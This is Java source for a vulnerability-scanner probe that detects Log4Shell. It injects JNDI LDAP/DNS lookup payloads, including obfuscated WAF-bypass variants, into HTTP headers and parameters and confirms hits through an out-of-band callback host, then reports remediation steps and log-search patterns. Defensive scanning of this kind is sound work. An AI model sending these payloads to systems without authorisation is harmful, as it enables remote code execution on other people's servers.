package com.burpmax.active;

import java.util.*;
import static com.burpmax.model.Finding.*;

/**
 * Log4Shell / Log4j JNDI injection probe (CVE-2021-44228, CVE-2021-45046).
 *
 * Detection strategy: OOB only.
 * Log4Shell cannot be detected in-band — the vulnerability causes Log4j to
 * make an outbound JNDI/LDAP or DNS lookup; nothing appears in the HTTP response.
 *
 * Payloads are injected into every HTTP header (not just params) because
 * Log4j commonly logs: User-Agent, X-Forwarded-For, Referer, Authorization,
 * X-Api-Version, and any custom headers. Parameters are also tested since
 * some apps log request parameter values.
 *
 * Payload variants cover:
 *   - Basic JNDI LDAP:   ${jndi:ldap://HOST/a}
 *   - DNS variant:       ${jndi:dns://HOST/a}
 *   - Nested obfuscation: ${${lower:j}ndi:${lower:l}dap://HOST/a}
 *   - Case mangling:     ${J${lower:N}dI:LdAp://HOST/a}
 *   - Slash bypass:      ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://HOST/a}
 * The last three bypass naive string-matching WAF rules while still being
 * processed by a vulnerable Log4j instance.
 *
 * Requires a configured OobClient. If no OobClient is available, this probe
 * is a no-op (cannot produce false positives, just no findings).
 */
public class Log4ShellProbe {

    // Payloads — HOST placeholder replaced with OOB hostname per injection
    private static final List<String[]> PAYLOADS = List.of(
        new String[]{"${jndi:ldap://HOST/log4shell}",                       "basic-ldap"},
        new String[]{"${jndi:dns://HOST/log4shell}",                        "basic-dns"},
        new String[]{"${${lower:j}ndi:${lower:l}dap://HOST/log4shell}",     "lower-bypass"},
        new String[]{"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://HOST/log4shell}", "colons-bypass"}
    );

    // Headers that Log4j commonly logs
    private static final List<String> TARGET_HEADERS = List.of(
        "User-Agent",
        "X-Forwarded-For",
        "Referer",
        "X-Api-Version",
        "Authorization",
        "Accept-Language",
        "X-Request-Id",
        "X-Correlation-Id",
        "CF-Connecting-IP",
        "True-Client-IP"
    );

    // ── Main entry point ──────────────────────────────────────────────────────
    public static List<ActiveScanResult> probe(ProbeContext ctx,
                                               RequestBuilder rb,
                                               HttpSender sender,
                                               OobClient oob) {
        // OOB required — no in-band detection possible
        if (oob == null || !oob.isAvailable()) return List.of();

        List<ActiveScanResult> results = new ArrayList<>();

        // Use a single OOB host per endpoint to keep request count down.
        // (One DNS callback from any header/param on this endpoint is enough
        //  to confirm Log4Shell — we record the most representative injection.)
        String oobHost = oob.generateHost("log4shell-" + ctx.host);
        if (oobHost == null) return results;

        // ── Inject into headers ────────────────────────────────────────────
        for (String header : TARGET_HEADERS) {
            for (String[] p : PAYLOADS) {
                String payload = p[0].replace("HOST", oobHost);
                byte[] probeReq = rb.injectHeader(ctx.originalRequest, header, payload);
                // Record before sending — callback must match even if response is null.
                oob.recordInjection(oobHost, "Log4Shell / Log4j RCE",
                        ctx.url, header, payload);
                sender.send(ctx.service, probeReq);  // fire-and-forget
                // One payload variant per header is enough for detection
                break;
            }
        }

        // ── Inject into parameters (Log4j may log param values too) ───────
        for (String param : ctx.allParamNames()) {
            String payload = PAYLOADS.get(0)[0].replace("HOST", oobHost);
            byte[] probeReq = rb.buildProbeRequest(ctx, param, payload);
            // Record before sending.
            oob.recordInjection(oobHost, "Log4Shell / Log4j RCE",
                    ctx.url, param, payload, probeReq);
            sender.send(ctx.service, probeReq);  // fire-and-forget
        }

        return results;
    }

    // ── Finding builder (called by ActiveScanner after OOB poll) ─────────────

    /**
     * Build a finding from a confirmed OOB hit. Called by ActiveScanner
     * after pollAndMatch() returns a Log4Shell hit.
     */
    public static ActiveScanResult buildFinding(OobClient.OobHit hit) {
        return new ActiveScanResult(
            "Log4Shell / Log4j JNDI Injection (CVE-2021-44228)", SEV_CRITICAL,
            "Log4Shell was confirmed via an out-of-band DNS/LDAP callback. The payload '" +
            hit.payload() + "' was injected into '" + hit.parameter() +
            "' and the server initiated a JNDI lookup to the OOB host (" + hit.interactionDetail() +
            "). A vulnerable Log4j instance (2.0-beta9 to 2.14.1) is evaluating JNDI " +
            "expressions in logged input, enabling full Remote Code Execution by pointing " +
            "the JNDI URL to an attacker-controlled LDAP/RMI server hosting a malicious class.",
            "OOB interaction: " + hit.interactionDetail() + " | Injection: " + hit.parameter() +
            " | Payload: " + trunc(hit.payload(), 100),
            "PRIMARY FIX - Upgrade Log4j Immediately:\n" +
            "- Java 8:  Log4j >= 2.17.1 (fully patched)\n" +
            "- Java 7:  Log4j >= 2.12.4\n" +
            "- Java 6:  Log4j >= 2.3.2\n" +
            "If immediate upgrade is not possible, apply emergency mitigations IN ORDER:\n" +
            "1. Set JVM flag: -Dlog4j2.formatMsgNoLookups=true (effective in 2.10–2.14.1)\n" +
            "2. Remove JndiLookup class from the JAR:\n" +
            "   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class\n" +
            "3. Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true environment variable.\n\n" +
            "NETWORK CONTROLS:\n" +
            "- Block all outbound LDAP (389, 636), RMI (1099), and DNS from app servers.\n" +
            "  Without outbound connectivity, JNDI payloads cannot retrieve the malicious class.\n\n" +
            "DETECTION:\n" +
            "- Search all logs for ${jndi:, ${${, ${lower:j}ndi patterns.\n" +
            "- Check for outbound LDAP/RMI connections in network flow logs.\n" +
            "- Assume any pre-patch systems were exploited and conduct incident response.",
            "CWE-917",
            hit.endpoint(), hit.parameter(), hit.payload(), "", hit.interactionDetail());
    }

    private static String trunc(String s, int n) {
        return s == null ? "" : s.length() > n ? s.substring(0, n) + "..." : s;
    }
}
